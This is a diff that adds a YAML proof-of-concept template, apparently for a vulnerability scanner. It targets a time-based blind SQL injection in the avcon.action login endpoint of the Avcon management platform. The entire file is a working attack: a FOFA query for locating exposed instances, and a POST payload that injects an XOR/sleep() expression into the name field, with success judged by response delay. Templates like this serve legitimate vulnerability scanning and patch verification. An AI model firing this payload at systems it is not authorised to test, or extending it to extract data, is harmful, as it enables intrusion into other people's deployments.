@@ -1,0 +1,20 @@
+id: poc-yaml-avcon-avcon-action-sqli
+info:
+  name: Avcon综合管理平台 avcon.action SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: avcon
+  fofa: title="AVCON-系统管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /avcon.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=0'XOR(if(now()=sysdate()%2Csleep({{.t1}})%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
+  expression: status_code == 200 && contains(body,"登录失败") && duration >= t1 && duration
+    < t2
+transport: http
